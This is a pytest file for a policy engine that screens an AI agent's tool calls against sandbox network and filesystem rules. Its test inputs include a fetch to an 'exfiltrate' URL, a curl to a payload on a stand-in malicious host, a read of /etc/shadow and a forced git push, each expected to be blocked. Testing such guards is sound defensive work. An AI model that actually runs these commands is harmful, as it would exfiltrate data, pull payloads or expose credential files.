"""Tests for NemoClaw integration in FullEngine."""

import pytest
from pathlib import Path

from safeclaw.config import SafeClawConfig
from safeclaw.engine.core import ToolCallEvent
from safeclaw.engine.full_engine import FullEngine
from safeclaw.engine.knowledge_graph import SP


def _write_yaml(policy_dir: Path, filename: str, content: str) -> None:
    """Helper to write a YAML file to the policy directory."""
    policy_dir.mkdir(parents=True, exist_ok=True)
    (policy_dir / filename).write_text(content, encoding="utf-8")


# ======================================================================
# Legacy format fixtures
# ======================================================================


@pytest.fixture
def legacy_nemoclaw_policy_dir(tmp_path):
    """Create a NemoClaw policy directory with legacy format policies."""
    policy_dir = tmp_path / "nemoclaw"
    _write_yaml(
        policy_dir,
        "sandbox.yaml",
        """
rules:
  - name: github-https
    host: "github.com"
    port: 443
    protocol: https
    allow: true
  - name: pypi
    host: "pypi.org"
    port: 443
    protocol: https
    allow: true

filesystem:
  - path: "/sandbox"
    mode: "read-write"
  - path: "/usr"
    mode: "read-only"
  - path: "/etc/shadow"
    mode: "denied"
""",
    )
    return policy_dir


@pytest.fixture
def legacy_engine(tmp_path, legacy_nemoclaw_policy_dir):
    """Create a test engine with NemoClaw enabled (legacy format)."""
    config = SafeClawConfig(
        data_dir=tmp_path,
        ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
        audit_dir=tmp_path / "audit",
        nemoclaw_enabled=True,
        nemoclaw_policy_dir=legacy_nemoclaw_policy_dir,
    )
    return FullEngine(config)


# ======================================================================
# Real format fixtures
# ======================================================================


@pytest.fixture
def real_nemoclaw_policy_dir(tmp_path):
    """Create a NemoClaw policy directory with real format policies."""
    policy_dir = tmp_path / "nemoclaw"
    _write_yaml(
        policy_dir,
        "sandbox.yaml",
        """
network_policies:
  github:
    name: github
    endpoints:
      - host: github.com
        port: 443
        protocol: rest
        enforcement: enforce
        tls: terminate
    binaries:
      - { path: /usr/bin/git }
  pypi:
    name: pypi
    endpoints:
      - host: pypi.org
        port: 443
        protocol: rest
        enforcement: enforce
    binaries:
      - { path: /usr/bin/pip }

filesystem_policy:
  read_write:
    - /sandbox
  read_only:
    - /usr
""",
    )
    return policy_dir


@pytest.fixture
def real_engine(tmp_path, real_nemoclaw_policy_dir):
    """Create a test engine with NemoClaw enabled (real format)."""
    config = SafeClawConfig(
        data_dir=tmp_path,
        ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
        audit_dir=tmp_path / "audit",
        nemoclaw_enabled=True,
        nemoclaw_policy_dir=real_nemoclaw_policy_dir,
    )
    return FullEngine(config)


@pytest.fixture
def engine_no_nemoclaw(tmp_path):
    """Create a test engine without NemoClaw."""
    config = SafeClawConfig(
        data_dir=tmp_path,
        ontology_dir=Path(__file__).parent.parent / "safeclaw" / "ontologies",
        audit_dir=tmp_path / "audit",
    )
    return FullEngine(config)


# ======================================================================
# Legacy format engine init tests
# ======================================================================


class TestLegacyNemoClawEngineInit:
    def test_nemoclaw_triples_loaded(self, legacy_engine):
        results = legacy_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoNetworkRule . }}
        """)
        assert len(results) >= 2

    def test_nemoclaw_filesystem_triples_loaded(self, legacy_engine):
        results = legacy_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoFilesystemRule . }}
        """)
        assert len(results) >= 3

    def test_no_nemoclaw_triples_when_disabled(self, engine_no_nemoclaw):
        results = engine_no_nemoclaw.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{
                ?rule a sp:NemoNetworkRule .
                ?rule sp:source "nemoclaw" .
            }}
        """)
        assert len(results) == 0

    def test_policy_checker_nemoclaw_enabled(self, legacy_engine):
        assert legacy_engine.policy_checker._nemoclaw_enabled is True

    def test_policy_checker_nemoclaw_disabled(self, engine_no_nemoclaw):
        assert engine_no_nemoclaw.policy_checker._nemoclaw_enabled is False


# ======================================================================
# Real format engine init tests
# ======================================================================


class TestRealNemoClawEngineInit:
    def test_nemoclaw_triples_loaded(self, real_engine):
        results = real_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoNetworkRule . }}
        """)
        assert len(results) >= 2

    def test_nemoclaw_filesystem_triples_loaded(self, real_engine):
        results = real_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?rule WHERE {{ ?rule a sp:NemoFilesystemRule . }}
        """)
        assert len(results) >= 2

    def test_policy_group_stored(self, real_engine):
        results = real_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT DISTINCT ?group WHERE {{
                ?rule a sp:NemoNetworkRule ;
                      sp:policyGroup ?group .
            }}
        """)
        groups = {str(r["group"]) for r in results}
        assert "github" in groups
        assert "pypi" in groups

    def test_binary_restrictions_stored(self, real_engine):
        results = real_engine.kg.query(f"""
            PREFIX sp: <{SP}>
            SELECT ?binary WHERE {{
                ?rule a sp:NemoNetworkRule ;
                      sp:binaryRestriction ?binary .
            }}
        """)
        binaries = {str(r["binary"]) for r in results}
        assert "/usr/bin/git" in binaries
        assert "/usr/bin/pip" in binaries


# ======================================================================
# Legacy format network enforcement
# ======================================================================


class TestLegacyNemoClawNetworkEnforcement:
    @pytest.mark.asyncio
    async def test_allowed_web_fetch(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://github.com/api/repos"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_blocked_web_fetch(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://evil-site.com/exfiltrate"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "NemoClaw" in decision.reason or "network allowlist" in decision.reason

    @pytest.mark.asyncio
    async def test_curl_to_blocked_host(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "curl https://malicious.example.com/payload"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is True


# ======================================================================
# Real format network enforcement
# ======================================================================


class TestRealNemoClawNetworkEnforcement:
    @pytest.mark.asyncio
    async def test_allowed_web_fetch(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://github.com/api/repos"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_blocked_web_fetch(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://evil-site.com/exfiltrate"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is True

    @pytest.mark.asyncio
    async def test_git_command_to_allowed_host(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "git clone https://github.com/repo.git"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_curl_to_github_blocked_by_binary(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "curl https://github.com/api"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is True


# ======================================================================
# Legacy format filesystem enforcement
# ======================================================================


class TestLegacyNemoClawFilesystemEnforcement:
    @pytest.mark.asyncio
    async def test_write_to_sandbox_allowed(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/sandbox/output/result.txt"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_write_to_readonly_blocked(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/usr/local/bin/exploit"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "read-only" in decision.reason

    @pytest.mark.asyncio
    async def test_read_from_readonly_allowed(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/usr/local/lib/libz.so"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_read_denied_path_blocked(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/etc/shadow"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "denied" in decision.reason

    @pytest.mark.asyncio
    async def test_outside_sandbox_blocked(self, legacy_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/home/user/documents/secret.txt"},
        )
        decision = await legacy_engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "outside NemoClaw sandbox" in decision.reason


# ======================================================================
# Real format filesystem enforcement
# ======================================================================


class TestRealNemoClawFilesystemEnforcement:
    @pytest.mark.asyncio
    async def test_write_to_sandbox_allowed(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/sandbox/output/result.txt"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_write_to_readonly_blocked(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="write",
            params={"file_path": "/usr/local/bin/exploit"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is True
        assert "read-only" in decision.reason

    @pytest.mark.asyncio
    async def test_read_from_readonly_allowed(self, real_engine):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/usr/local/lib/libz.so"},
        )
        decision = await real_engine.evaluate_tool_call(event)
        assert decision.block is False


# ======================================================================
# Hot reload
# ======================================================================


class TestNemoClawHotReload:
    @pytest.mark.asyncio
    async def test_reload_picks_up_new_policy(self, tmp_path):
        policy_dir = tmp_path / "nemoclaw"
        _write_yaml(
            policy_dir,
            "sandbox.yaml",
            """
rules:
  - name: github
    host: "github.com"
    port: 443
    protocol: https
    allow: true
""",
        )
        config = SafeClawConfig(
            data_dir=tmp_path,
            ontology_dir=(Path(__file__).parent.parent / "safeclaw" / "ontologies"),
            audit_dir=tmp_path / "audit",
            nemoclaw_enabled=True,
            nemoclaw_policy_dir=policy_dir,
        )
        engine = FullEngine(config)

        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="web_fetch",
            params={"url": "https://pypi.org/simple/"},
        )
        decision = await engine.evaluate_tool_call(event)
        assert decision.block is True

        _write_yaml(
            policy_dir,
            "sandbox.yaml",
            """
rules:
  - name: github
    host: "github.com"
    port: 443
    protocol: https
    allow: true
  - name: pypi
    host: "pypi.org"
    port: 443
    protocol: https
    allow: true
""",
        )

        await engine.reload()

        decision2 = await engine.evaluate_tool_call(event)
        assert decision2.block is False


# ======================================================================
# Existing tests unaffected
# ======================================================================


class TestExistingTestsUnaffected:
    @pytest.mark.asyncio
    async def test_read_file_still_allowed(self, engine_no_nemoclaw):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="read",
            params={"file_path": "/src/main.py"},
        )
        decision = await engine_no_nemoclaw.evaluate_tool_call(event)
        assert decision.block is False

    @pytest.mark.asyncio
    async def test_force_push_still_blocked(self, engine_no_nemoclaw):
        event = ToolCallEvent(
            session_id="test-session",
            user_id="test-user",
            tool_name="exec",
            params={"command": "git push --force origin main"},
        )
        decision = await engine_no_nemoclaw.evaluate_tool_call(event)
        assert decision.block is True
